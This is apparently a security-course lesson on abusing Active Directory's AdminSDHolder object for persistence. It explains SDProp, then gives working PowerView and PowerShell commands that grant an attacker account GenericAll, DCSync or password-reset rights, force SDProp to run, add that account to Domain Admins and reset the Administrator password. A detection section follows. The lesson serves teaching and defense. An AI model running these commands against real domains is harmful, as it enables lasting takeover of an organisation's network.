# AdminSDHolder Abuse

## Unit 7 - Topic 4 | Persistence

---

## Overview

**AdminSDHolder** is a built-in AD security mechanism that protects privileged accounts by periodically resetting their ACLs. Attackers can abuse this feature by modifying the AdminSDHolder object's ACL — any permissions added there will automatically propagate to all protected accounts every 60 minutes via the SDProp process.

---

## 1. How AdminSDHolder Works

```
ADMINSDHOLDER MECHANISM:

NORMAL (Defensive) PURPOSE:
┌──────────────────┐    SDProp runs    ┌─────────────────┐
│  AdminSDHolder   │    every 60 min   │ Protected       │
│  Object (ACL)    │ ──────────────→  │ Accounts:       │
│                  │    Copies ACL to  │ - Domain Admins │
│  CN=AdminSD      │    all protected  │ - Enterprise Adm│
│  Holder,CN=      │    objects        │ - Schema Admins │
│  System          │                   │ - Administrators│
│                  │                   │ - Account Ops   │
│  Default ACL:    │                   │ - Server Ops    │
│  DA: Full Ctrl   │                   │ - Backup Ops    │
│  EA: Full Ctrl   │                   │ - krbtgt        │
└──────────────────┘                   └─────────────────┘

ABUSED (Attacker):
┌──────────────────┐    SDProp runs    ┌─────────────────┐
│  AdminSDHolder   │    every 60 min   │ Protected       │
│  (MODIFIED ACL)  │ ──────────────→  │ Accounts:       │
│                  │                   │                 │
│  Added:          │    Copies NEW     │ All protected   │
│  attacker user   │    permissions    │ accounts now    │
│  GenericAll      │    to ALL         │ have attacker   │
│                  │    protected      │ with GenericAll!│
│                  │    accounts       │                 │
└──────────────────┘                   └─────────────────┘

RESULT: Even if defenders remove attacker's permissions
        from individual accounts, SDProp RESTORES them
        every 60 minutes!
```

---

## 2. Exploiting AdminSDHolder

```powershell
# === STEP 1: Modify AdminSDHolder ACL ===
# Requires: DA or WriteDACL on AdminSDHolder

# PowerView:
Add-DomainObjectAcl -TargetIdentity \
  "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights All

# AD Module:
$acl = Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$user = New-Object System.Security.Principal.NTAccount("corp\attacker_user")
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  $user, "GenericAll", "Allow"
)
$acl.AddAccessRule($ace)
Set-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local" $acl

# === STEP 2: Wait for SDProp (or force it) ===
# SDProp runs every 60 minutes by default
# Force immediate execution:

# Method 1: ldp.exe
# Connect to DC → Modify → DN: (empty)
# Attribute: runProtectAdminGroupsTask → Value: 1

# Method 2: PowerShell
$root = [ADSI]"LDAP://RootDSE"
$root.Put("runProtectAdminGroupsTask", 1)
$root.SetInfo()

# === STEP 3: Verify ===
# After SDProp runs, check permissions on protected accounts:
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | \
  Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser attacker_user).objectsid}
# Should show GenericAll!

# === STEP 4: Abuse the permissions ===
# Now attacker_user has GenericAll on ALL protected accounts!
# Add self to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker_user

# Reset DA password:
Set-DomainUserPassword -Identity Administrator \
  -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
```

---

## 3. Protected Objects List

```
OBJECTS PROTECTED BY ADMINSDHOLDER:

DEFAULT PROTECTED GROUPS:
├── Account Operators
├── Administrators
├── Backup Operators
├── Domain Admins
├── Domain Controllers
├── Enterprise Admins
├── Print Operators
├── Read-only Domain Controllers
├── Replicator
├── Schema Admins
└── Server Operators

PROTECTED ACCOUNTS:
├── Administrator (RID 500)
├── krbtgt
└── Any member of above groups (adminCount=1)

KEY ATTRIBUTE:
├── adminCount = 1 → Account IS protected
├── adminCount = 0 or null → Not protected
└── NOTE: adminCount is SET when user joins protected group
          but NOT CLEARED when they leave!
    → "Orphaned adminCount" = common finding
```

---

## 4. Persistence Through AdminSDHolder

```bash
# === WHY THIS IS EXCELLENT PERSISTENCE ===

# SCENARIO:
# 1. Attacker modifies AdminSDHolder ACL
# 2. Defenders discover and remove attacker from DA group
# 3. Defenders even audit individual account ACLs
# 4. But they don't check AdminSDHolder!
# 5. 60 minutes later → SDProp runs
# 6. Attacker's permissions RESTORED on all protected accounts
# 7. Attacker re-adds to Domain Admins
# CYCLE REPEATS!

# === STEALTHY PERMISSIONS ===
# Instead of GenericAll, use more subtle permissions:

# ForceChangePassword only:
Add-DomainObjectAcl -TargetIdentity \
  "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights ResetPassword

# DCSync rights:
Add-DomainObjectAcl -TargetIdentity \
  "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights DCSync

# WriteDACL (can grant self more rights later):
Add-DomainObjectAcl -TargetIdentity \
  "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights WriteDacl
```

---

## 5. Detection and Defense

```powershell
# === DETECTION ===
# Check AdminSDHolder ACL for unauthorized entries:
Get-DomainObjectAcl -SearchBase \
  "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -ResolveGUIDs | \
  select SecurityIdentifier, ActiveDirectoryRights | \
  ForEach-Object {
    $_ | Add-Member -NotePropertyName 'Name' \
      -NotePropertyValue (Convert-SidToName $_.SecurityIdentifier) -PassThru
  }

# Compare with expected entries (DA, EA, SYSTEM only)
# Any unexpected user/group = compromise indicator!

# Monitor Event IDs:
# 5136: Directory service object was modified
#   → Filter for AdminSDHolder changes
# 4780: ACL was set on accounts that are members of admin groups
#   → Indicates SDProp ran

# === DEFENSE ===
# 1. Monitor AdminSDHolder ACL changes
# 2. Regular audit of AdminSDHolder permissions
# 3. Alert on Event ID 5136 for AdminSDHolder
# 4. Compare AdminSDHolder ACL to baseline
# 5. Use PingCastle for automated checking
```

| Defense | Description |
|---------|-------------|
| **Baseline ACL** | Document expected AdminSDHolder permissions |
| **Monitor changes** | Alert on any AdminSDHolder modification |
| **Regular audit** | Compare current ACL to baseline weekly |
| **PingCastle** | Automated AD security assessment |
| **BloodHound** | Shows AdminSDHolder abuse paths |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **AdminSDHolder** | Template ACL for all protected accounts |
| **SDProp** | Propagates AdminSDHolder ACL every 60 minutes |
| **Abuse** | Add attacker to AdminSDHolder ACL → auto-propagated |
| **Persistence** | Defenders remove permissions → SDProp restores them |
| **Detection** | Audit AdminSDHolder ACL, Event ID 5136 |
| **Protected** | DA, EA, Schema Admins, Administrators, etc. |

---

## Quick Revision Questions

1. **What is SDProp and how often does it run?**
2. **Why is AdminSDHolder abuse effective for persistence?**
3. **What happens to adminCount when a user is removed from a protected group?**
4. **How do you force SDProp to run immediately?**
5. **What permissions on AdminSDHolder provide the stealthiest persistence?**

---

[← Previous: Skeleton Key](03-skeleton-key.md) | [Next: Group Policy Persistence →](05-group-policy-persistence.md)

---

*Unit 7 - Topic 4 of 6 | [Back to README](../README.md)*
